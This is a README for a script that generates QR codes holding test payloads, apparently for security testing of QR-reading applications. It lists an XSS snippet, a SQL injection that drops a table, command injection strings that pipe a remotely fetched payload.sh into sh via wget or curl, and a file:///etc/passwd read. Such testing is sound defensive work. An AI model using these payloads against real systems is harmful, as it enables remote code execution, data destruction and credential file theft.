# Overview

The script [`gen_qrcode.py`](gen_qrcode.py) uses the `qrcode` Python library to create QR codes for different types of payloads. Each QR code is saved as a PNG image file in the current directory.

Note that a single QR code can't hold arbitrarily large blobs of data. In its largest version (Version 40, Low‐ECC), a QR code can store up to about 2 950 bytes (≈ 2.9 KB) of binary data.

# Usage

**Install dependencies**  
   Make sure you have the `qrcode` library installed:
   ```sh
   pip install qrcode[pil]
   ```

# QR code tests

## XSS

```python
xss_payload = "<script>alert('XSS!');</script>"
generate_qr(xss_payload, "qr_xss.png", "XSS payload")
```

## SQL injection

```
sql_payload = "'; DROP TABLE logs;-- "
generate_qr(sql_payload, "qr_sql_injection.png", "SQL-injection payload")
```

## Command injection payload using wget/curl

```
cmd_payload = "`; wget https://www.botvrij.eu/payload.sh -O- | sh; #`"
generate_qr(cmd_payload, "qr_cmd_injection_wget.png", "Command injection payload wget")
```

## Command injection payload using curl

```
cmd_payload_curl = "`; curl -s https://www.botvrij.eu/payload.sh | sh; #`"
generate_qr(cmd_payload_curl, "qr_cmd_injection_curl.png", "Command injection payload curl")
```

## File inclusion payload

```
file_inclusion_payload = "file:///etc/passwd"
generate_qr(file_inclusion_payload, "qr_file_inclusion.png", "File inclusion payload")
```

## Email payload

```
email_payload = "mailto:info@botvrij.eu?subject=Test&body=QR"
generate_qr(email_payload, "qr_email.png", "Email payload")
```

## URL payload

```
url_payload = "https://www.botvrij.eu/payload-test"
generate_qr(url_payload, "qr_url.png", "URL payload")
```